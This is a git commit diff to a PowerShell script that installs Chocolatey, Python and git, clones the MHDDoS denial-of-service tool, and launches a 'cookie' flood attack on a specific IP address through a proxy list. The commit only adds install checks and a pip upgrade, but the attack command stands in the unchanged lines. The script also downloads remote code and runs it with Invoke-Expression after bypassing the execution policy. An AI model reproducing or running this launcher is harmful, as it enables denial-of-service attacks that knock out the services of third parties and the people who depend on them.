8b5fb5403845bbd827905bff8f2e2fc156d63189
enkiark <96149033+enkiark@users.noreply.github.com>
2024-08-01 11:02:15 +0900

    Update mhddoswindows.ps1

--- mhddoswindows.ps1
+++ mhddoswindows.ps1
@@ -27,10 +27,21 @@ Remove-Item C:\ProgramData\chocolatey -Recurse -Force
 # Install Choco
 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
 Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
-
+if (choco list --lo -r -e python3) {
+  Write-Host "'python3' is installed"
+}else{
 choco install -y python3 # Install Python
 
+}
+
+if (choco list --lo -r -e git) {
+  Write-Host "'git' is installed"
+}else{
 choco install -y git # Install GIT
+
+}
+
+
 
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") # Refresh env variables
 
@@ -43,6 +54,8 @@ Set-Location '~'
 Remove-Item 'MHDDoS' -Recurse -Force
 git clone 'https://github.com/MatrixTM/MHDDoS.git'
 Set-Location '~/MHDDoS'
+python.exe -m pip install --upgrade pip
 python -m pip install -r 'requirements.txt'
+
 
 python start.py cookie http://38.126.52.120:80  0  7250  proxy411221131.txt  2236000 2236000 true
